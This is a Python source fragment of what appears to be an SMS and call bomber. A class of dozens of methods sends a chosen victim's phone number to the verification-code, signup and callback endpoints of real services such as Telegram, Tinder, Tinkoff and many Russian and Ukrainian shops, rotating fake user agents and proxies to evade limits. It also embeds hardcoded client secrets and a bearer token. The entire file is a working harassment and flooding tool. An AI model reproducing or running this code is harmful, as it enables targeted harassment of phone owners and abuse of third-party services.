        requests.post(
            "https://deathstar.signal.is/auth",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def sipnet(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f"https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone={self.phone}",headers=headers_copy, proxies=proxies)

    def smartspace(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://smart.space/api/users/request_confirmation_code/",
            json={"mobile": self.phone, "action": "confirm_mobile"},headers=headers_copy, proxies=proxies)

    def sms4(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": self.phone, "ajax_demo_send": "1"},headers=headers_copy, proxies=proxies)

    def sovest(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://oauth.sovest.ru/oauth/authorize",
            data={
                "client_id": "dbo_web",
                "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                "username": self.phone,
                "recaptcha": "",
            },headers=headers_copy, proxies=proxies)

    def sportmasterua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://www.sportmaster.ua/",
            params={
                "module": "users",
                "action": "SendSMSReg",
                "phone": self.phone,
            },headers=headers_copy, proxies=proxies)


    def oyorooms(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(f"https://www.oyorooms.com/api/pwa/generateotp?phone={self.phone}&country_code=%2B7&nod=4&locale=en",headers=headers_copy, proxies=proxies)

    def sravni(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://www.sportmaster.ua/",
            params={
                "module": "users",
                "action": "SendSMSReg",
                "phone": self.phone,
            },headers=headers_copy, proxies=proxies)

    def startpizza(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://pizzasushiwok.ru/index.php",
            data={
                "aj": "50",
                "registration-phone": phone_mask(
                    self.phone_not_pluse, "+## (###) ###-##-##"
                ),
            },headers=headers_copy, proxies=proxies)

    def suandi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://suandshi.ru/mobile_api/register_mobile_user",
            params={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def sunlignt(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://api.sunlight.net/v3/customers/authorization/",
        data={"phone": self.phone_not_pluse},headers=headers_copy, proxies=proxies)

    def pizza_33(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": email(),
                "password": password(),
                "phone": self.phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },headers=headers_copy, proxies=proxies)

    def sushifuji(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://sushifuji.ru/sms_send_ajax.php",
            data={"name": "false", "phone": self.phone},headers=headers_copy, proxies=proxies)

    def sushigour(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "http://sushigourmet.ru/auth",
            data={"phone": phone_mask(self.phone_not_pluse, "8 (###) ###-##-##"), "stage": 1},
            headers=headers_copy, proxies=proxies)

    def laguna(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",
            data={"phone": phone_mask(self.phone_not_pluse, "8(###)###-##-##")},
            headers=headers_copy, proxies=proxies)

    def sumaster(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://client-api.sushi-master.ru/api/v1/auth/init",
            json={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def sushiprof(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.sushi-profi.ru/api/order/order-call/",
            json={"phone": self.phone, "name": _ru_name_()},
            headers=headers_copy, proxies=proxies)

    def sushivesla(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization",
            json={"phone": phone_mask(self.phone_not_pluse, "+# ### ###-##-##")},
            headers=headers_copy, proxies=proxies)

    def tabasko(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://tabasko.su/",
            data={
                "IS_AJAX": "Y",
                "COMPONENT_NAME": "AUTH",
                "ACTION": "GET_CODE",
                "LOGIN": self.phone,
            },headers=headers_copy, proxies=proxies)

    def tabris(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://lk.tabris.ru/reg/",
            data={"action": "phone", "phone": self.phone},headers=headers_copy, proxies=proxies)

    def tanuki(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.tanuki.ru/api/",
            json={
                "header": {
                    "version": "2.0",
                    "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",
                    "agent": {"device": "desktop", "version": "undefined undefined"},
                    "langId": "1",
                    "cityId": "9",
                },
                "method": {"name": "sendSmsCode"},
                "data": {"phone": f"({self.phone}", "type": 1},
            },headers=headers_copy, proxies=proxies)

    def tarantionofamely(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
            data={"action": "callback_phonenumber", "phone": self.phone},
            headers=headers_copy, proxies=proxies)


    def taxi310(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "http://62.149.7.19:7200/api/account/register/sendConfirmCode",
            json={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def taziritm(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": self.phone},
            headers=headers_copy, proxies=proxies)

    def tele2(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://msk.tele2.ru/api/validation/number/" + self.phone,
            json={"sender": "Tele2"},
            headers=headers_copy, proxies=proxies)

    def thehive(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://thehive.pro/auth/signup",
            json={"phone": self.phone},
            headers=headers_copy, proxies=proxies)

    def tiktok(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
                "https://m.tiktok.com/node/send/download_link",
                json={
                    "slideVerify": 0,
                    "language": "en",
                    "PhoneRegin": self.country_code,
                    "Mobile": self.phone,
                    "page": {"af_adset_id": 0, "pid": 0},
                }, headers=headers_copy, proxies=proxies)

    def tinder(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
            data={"phone_number": self.phone},
            headers=headers_copy, proxies=proxies)

    def tinkoff(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.tinkoff.ru/v1/sign_up",
            data={"phone": self.phone}, headers=headers_copy, proxies=proxies)

    def topladeba(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://topbladebar.ru/user_account/ajax.php?do=sms_code",
            data={"phone": f"{8}{self.phone_mask_2[2:]}"},
            headers=headers_copy, proxies=proxies)

    def topshop(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.top-shop.ru/login/loginByPhone/",
            data={"phone": self.phone_mask},
            headers=headers_copy, proxies=proxies)

    def tvoaapteka(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",
            data={"tel": "+" + self.phone_not_pluse, "change_code": 1},
            headers=headers_copy, proxies=proxies)

    def twitch(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://passport.twitch.tv/register?trusted_request=true",
            json={
                "birthday": {"day": 19, "month": 3, "year": 1988},
                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                "include_verification_code": True,
                "password": password(),
                "phone_number": self.phone,
                "username": username(),
            },headers=headers_copy, proxies=proxies)

    def online_sbis(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://online.sbis.ru/reg/service/", json={'firstName':'паша','middleName': _ru_name_(),'lastName': _ru_name_(),'sex':'1','birthDate':'7.9.1997','mobilePhone': self.phone,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'},
        headers=headers_copy, proxies=proxies)

    def rutaxi_ru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": self.phone[2:], "c": "3"},
        headers=headers_copy, proxies=proxies)

    def ubki(self,proxies):
        requests.post(
            "https://secure.ubki.ua/b2_api_xml/ubki/auth",
            json={
                "doc": {
                    "auth": {
                        "mphone": self.phone,
                        "bdate": "4.9.1989",
                        "deviceid": "00100",
                        "version": "1.0",
                        "source": "site",
                        "signature": "undefined",
                    }
                }
            }, headers={"User-Agent":user_agent(),"Accept": "application/json"}, proxies=proxies)

    def uklon(self,proxies):
        agent = user_agent()
        requests.post(
            "https://uklon.com.ua/api/v1/account/code/send",
            headers={'User-Agent':agent, "client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": self.phone}, proxies=proxies)
        requests.post(
            "https://partner.uklon.com.ua/api/v1/registration/sendcode",
            headers={'User-Agent':agent, "client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": self.phone}, proxies=proxies)

    def ulabka(self,proxies):
        requests.post(
            "https://www.r-ulybka.ru/login/ajax.php",
            data={
                "action": "sendcode",
                "phone": self.phone_mask,
            },headers=headers_copy, proxies=proxies)

    def uralsib(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": self.phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call"}, headers=headers_copy, proxies=proxies)

        requests.post(
            "https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": self.phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },headers=headers_copy, proxies=proxies)

    def artonline(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        password = password()
        requests.post('https://artonline24.ru/en/auth/?register=yes',
        data={"backurl":"2Fen", "AUTH_FORM":'Y', 'TYPE':'REGISTRATION', 'USER_NAME':name(),
        'USER_LAST_NAME':name(), 'PERSONAL_PHONE':self.phone_mask, 'USER_EMAIL':email(),
        'USER_PASSWORD':password, 'USER_CONFIRM_PASSWORD':password, 'Register':'Register'},
        headers=headers_copy, proxies=proxies)

    def utrair(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://b.utair.ru/api/v1/login/",
            data={"login": self.phone},
            headers=headers_copy, proxies=proxies)

    def vezitaxi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://vezitaxi.com/api/employment/getsmscode",
            params={
                "phone": self.phone,
                "city": 561,
                "callback": "jsonp_callback_35979",
            },headers=headers_copy, proxies=proxies)

    def viza(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://pay.visa.ru/api/Auth/code/request",
            json={"phoneNumber": self.phone},
            headers=headers_copy, proxies=proxies)

    def vodafone(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.vodafone.ua/shop/ru/vodafone_customer/register/sendSms/",
            data={
                "is_ajax": "true",
                "phone_number": self.phone},
            headers=headers_copy, proxies=proxies)

    def vks(self,proxies):
        requests.post(
            "https://shop.vsk.ru/ajax/auth/postSms/",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def webbank(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://ng-api.webbankir.com/user/v2/create",
            json={
                "lastName": _ru_name_(),
                "firstName": _ru_name_(),
                "middleName": _ru_name_(),
                "mobilePhone": self.phone,
                "email": email(),
                "smsCode": "",
            },headers=headers_copy, proxies=proxies)

    def wifimetro(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://cabinet.wi-fi.ru/api/auth/by-sms",
            data={"msisdn": self.phone},
            headers={"App-ID": "cabinet", 'User-Agent':user_agent()}, proxies=proxies)

    def work(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.iconjob.co/api/auth/verification_code",
            json={"phone": self.phone}, headers=headers_copy, proxies=proxies)

    def wowworks(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.wowworks.ru/v2/site/send-code",
            json={"phone": self.phone, "type": 2},
            headers=headers_copy, proxies=proxies)

    def yandexeda(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": self.phone},
            headers=headers_copy, proxies=proxies)

    def cloudmailru(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://cloud.mail.ru/api/v2/notify/applink",
        json={'phone': self.phone, 'api': 2, 'email': 'email','x-email': 'x-email'},
        headers=headers_copy, proxies=proxies)

    def smsint(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
        data={'name':name() ,'phone': self.phone, 'promo': 'yellowforma'},
        headers=headers_copy, proxies=proxies)

    def tehnosvit(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://tehnosvit.ua/iwantring_feedback.html",
        data={'feedbackName':name(),'feedbackPhone':self.phone},
        headers=headers_copy, proxies=proxies)

    def icqcom(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",
        data={
            "msisdn": self.phone_not_pluse,
            "locale": "en",
            "countryCode": "ru",
            "version": "1",
            "k": "ic1rtwz1s1Hj1O0r",
            "r": "46763",
        },
        headers=headers_copy, proxies=proxies)

    def comfy_ua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": _ru_name_(), "registration_phone": self.phone, "registration_email": email()},
        headers=headers_copy, proxies=proxies)

    def foxtrot(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": self.phone},
        headers=headers_copy, proxies=proxies)

    def panda99(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": _ru_name_(),
                "CB_PHONE": self.phone},
            headers=headers_copy, proxies=proxies)

    def grabtaxi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': self.phone, 'countryCode': 'ID', 'name': name(), 'email': email(), 'deviceToken': '*'},
        headers=headers_copy, proxies=proxies)

    def moscow(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={'1': self.phone},
        headers=headers_copy, proxies=proxies)

    def tinkoff(self,proxies):
        requests.post("https://api.tinkoff.ru/v1/sign_up", data={'phone': self.phone},
        headers=headers_copy, proxies=proxies)

    def citrus(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://my.citrus.ua/api/v2/register", data={'email': email(),'name': name(),'phone': self.phone,'password':'!@#qwe','confirm_passwor':'!@#qwe'},
        headers=headers_copy, proxies=proxies)

    def ubepmsmorg(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={'phone': self.phone},
        headers=headers_copy, proxies=proxies)

    def plink_tech(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://plink.tech/register/", json={'phone': self.phone},headers=headers_copy, proxies=proxies)

    def kasta(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://kasta.ua/api/v2/login/",
        data={'phone': self.phone},headers=headers_copy, proxies=proxies)

    def cabinet_wi_fi(self,proxies):
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={'msisdn': self.phone},
        headers={'App-ID': 'cabinet'}, proxies=proxies)


    def e_vse(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://e-vse.online/mail2.php", data={'object':'callback','user_name': name(),'contact_phone':self.phone},
        headers=headers_copy, proxies=proxies)

    def protovar(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://protovar.com.ua/aj_record",
        data={'telephone':self.phone},
        headers=headers_copy, proxies=proxies)

    def yapochink(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://yaponchik.net/login/login.php",
            data={
                "login": "Y",
                "countdown": 0,
                "step": "phone",
                "redirect": "/profile/",
                "phone": self.phone_mask,
            },headers=headers_copy, proxies=proxies)

    def youla(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://youla.ru/web-api/auth/request_code",
            data={"phone": self.phone},
            headers=headers_copy, proxies=proxies)

    def zoopt(sefl):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://zoopt.ru/api/",
            data={
                "module": "salin.core",
                "class": r"BonusServer\Auth",
                "action": "SendSms",
                "phone": self.phone_mask,
            },
            headers=headers_copy, proxies=proxies)

    def friendsclub(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": self.phone},
            headers=headers_copy, proxies=proxies)

    def fixprice(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://fix-price.ru/ajax/register_phone_code.php",
            data={
                "register_call": "Y",
                "action": "getCode",
                "phone": self.phone,
            }, headers=headers_copy, proxies=proxies)

    def smartomato(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://2407.smartomato.ru/account/session",
            json={
                "phone": self.phone_mask,
                "g-recaptcha-response": None,
            },headers=headers_copy, proxies=proxies)

    def etm(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": self.phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },headers=headers_copy, proxies=proxies)

    def derevenskoe(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://esh-derevenskoe.ru/index.php?route=checkout/checkout_ajax/sendcode&ajax=yes",
            data={"need_reg": "1", "phone": self.phone},headers=headers_copy, proxies=proxies)

    def groshi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://e-groshi.com/online/reg",
            data={
                "first_name": _ru_name_(),
                "last_name": _ru_name_(),
                "third_name": _ru_name_(),
                "phone": self.phone,
                "password": password(),
                "password2": password(),
            },headers=headers_copy, proxies=proxies)

    def edostav(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://vladimir.edostav.ru/site/CheckAuthLogin",
            data={"phone_or_email": self.phone},headers=headers_copy, proxies=proxies)

    def easypay(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.easypay.ua/api/auth/register",
            json={"phone": self.phone, "password": password()},
            headers=headers_copy, proxies=proxies)

    def delitime(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.delitime.ru/api/v2/signup",
            data={
                "SignupForm[username]": self.phone,
                "SignupForm[device_type]": 3,
            },headers=headers_copy, proxies=proxies)

    def creditter(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.creditter.ru/confirm/sms/send",
            json={
                "phone": self.phone_mask,
                "type": "register",
            },headers=headers_copy, proxies=proxies)

    def cleversite(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://clients.cleversite.ru/callback/run.php",
            data={
                "siteid": "62731",
                "num": self.phone,
                "title": "Онлайн-консультант",
                "referrer": "https://m.cleversite.ru/call",
            },headers=headers_copy, proxies=proxies)

    def carsmile(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.carsmile.com/",
            json={
                "operationName": "enterPhone",
                "variables": {"phone": self.phone},
                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",
            },headers=headers_copy, proxies=proxies)

    def callmyphone(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://callmyphone.org/do-call",
            data={"phone": self.phone, "browser": "undefined"},
            headers=headers_copy, proxies=proxies)

    def telegram(self,proxies):
        requests.post(
            "https://my.telegram.org/auth/send_password",
            data=('phone='+self.phone),
            headers={'User-Agent':user_agent(), 'DNT':'1'}, proxies=proxies)

    def qiwi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://mobile-api.qiwi.com/oauth/authorize",
        headers=headers_copy,
        data={'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': self.phone, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'}, proxies=proxies)

    def zaminka(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://zaimika.com/contact?action=checkSms&phone='+phone_mask(self.phone_not_pluse, "#(###)###-##-##")+'&typeCheck=check',headers=headers_copy, proxies=proxies)

    def buzzolls(self,proxies):
        requests.get(
        "https://it.buzzolls.ru:9995/api/v2/auth/register",
            params={"phoneNumber": self.phone},
            headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3", 'User-Agent':user_agent()}, proxies=proxies)

    def boosty(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://api.boosty.to/oauth/phone/authorize",
        data={"client_id": self.phone},
        headers=headers_copy, proxies=proxies)

    def bluefin(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://bluefin.moscow/auth/register/",
        data={
            "phone": phone_mask(self.phone_not_pluse[1:], "(###)###-##-##"),
            "sendphone": "Далее",
        },headers=headers_copy, proxies=proxies)

    def alfalife(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://alfalife.cc/auth.php",
        data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def beltelecom(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
        data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def bamperby(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://bamper.by/registration/?step=1",
        data={
            "phone": self.phone,
            "submit": "Запросить смс подтверждения",
            "rules": "on",
        },headers=headers_copy, proxies=proxies)

    def bartokyo(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://bartokyo.ru/ajax/login.php",
        data={
                "user_phone": phone_mask(self.phone_not_pluse, "+# (###) ###-####"),
        },headers=headers_copy, proxies=proxies)

    def avtobzvon(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://avtobzvon.ru/request/makeTestCall",
        params={"to": phone_mask(self.phone_not_pluse[1:], "(###) ###-##-##")},
        headers=headers_copy, proxies=proxies)

    def oauth_av(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://oauth.av.ru/check-phone",
        json={"phone": self.phone_mask},headers=headers_copy, proxies=proxies)

    def api_prime(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
        data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def apteka(self,proxies):
        phoneee = phone_mask(phone = self.phone_not_pluse,maska="+# (###) ###-##-##")
        headers = {
            'authority': 'api.apteka.ru',
            'accept': 'application/json, text/plain, */*',
            'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1YzJiYjc0Zi1jZGVlLTY4NDctNzY4Yy1jZGE4YWY4MGYyY2IiLCJqdGkiOiI2MDQ2MmI2OTU2MWNhMzkyY2UzMzkxNTIiLCJleHAiOjE2MzA3NjMzNjksIm5iZiI6MTYxNTIxMTM2OSwicm9sZSI6IlNoYWRvd1VzZXIiLCJpYXQiOjE2MTUyMTEzNjl9.QfN3Lo69qhlNXxXGFdZAM0ZgCrutEW-76SwjPeWruLZVKFxqOMRXhBSD0JQ0NH3PW5JbVUKFLQO0Mlg4DomGi2lUHSooOMWq77iwQDnhETGRRybUP4_NexLy7zK0LkNk5p-1Gu0Nguw5Q5SgRLrW6Iqbyh5oWIp7twB6YUInJRqLNLWRtDjNJSWXOSWfNyK7UDMEE3VoPzbjiVoSMrYqHfcq_0Mu8hHZvZU-p4C1YfMZ-LkmKXlAhhWkOkg8zVAFykOhGgSzYhR7H8Zrffky4KFSPBPwkITJ5LGQuVeliyBHTr9KchnQHJG1ufOSut8cBmvc5apvhwO3jSwR_xaVuWfQ-a6PHIW3y4EqYGlOPCX0WC23jsVnGohxWOU6k6EB-FenGkvkqVWSN4ON6ifTzDbWZ_f3_zRpCACyT2Mw0lAshQLm4v-yWbbW_Qd1NQMQ5P-41oFEpNXoxX9zqNpiI_Q9Oqci2gH7We0AbKi2lY18feHj-ViuinIHM8uMRTUYC06_c2_7oAmez800Ap7s9IYfmKxpNqlfOnWLrU6LV14yInvr0qi5jhZ35ONhQrabAnahx-SIhYE-CnNpgC-ei1WBDIBCRFwVEWaOdtZak9rIxJLAenNb32xK1-LbziUjlsCsB7NgpOfYOVJW-41rwerH1SopfbWMCbysvxlKTbY',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/json',
            'origin': 'https://apteka.ru',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://apteka.ru/additional-vitamins/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        data = '{"phone":"sadd","cityId":"5e57803249af4c0001d64407"}'.replace('sadd', phoneee)
        response = requests.post('https://api.apteka.ru/Auth/Auth_Code', headers=headers, data=data, proxies=proxies)

    def alpari(self,proxies):
        requests.post(
        "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
        headers={'User-Agent':user_agent(), 'DNT':'1', "Referer": "https://alpari.com/en/registration/"},
        json={
            "client_type": "personal",
            "email": email(),
            "mobile_phone": self.phone,
            "deliveryOption": "sms",
        }, proxies=proxies)

    def aistaxi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "http://94.154.218.82:7201/api/account/register/sendConfirmCode",
        json={"phone": self.phone},headers=headers_copy, proxies=proxies)


    def samaraetagi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://domclick.ru/cas/rest/api/v3/users/entry/'+self.phone_not_pluse[1:]+'?registrationSmsRequired=false&source=topline', headers=headers_copy, data={}, proxies=proxies)
        requests.post('https://api.domclick.ru/core/terms/api/open/v1/acceptanceRequest', headers=headers_copy, proxies=proxies)


    def nb99(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://99nb.ru/predata_send.php',
        data={'product_id':'Shapka', 'utm_source':' ', 'campaign':' ', 'utm_medium':' ', 'ga_tid':'UA-100030358-1', 'phone':f"8{phone_mask(self.phone_not_pluse[1:], '(###)+###-##-##')}", 'calc-uri':''},
        headers=headers_copy, proxies=proxies)

    def farpost(self,proxies):
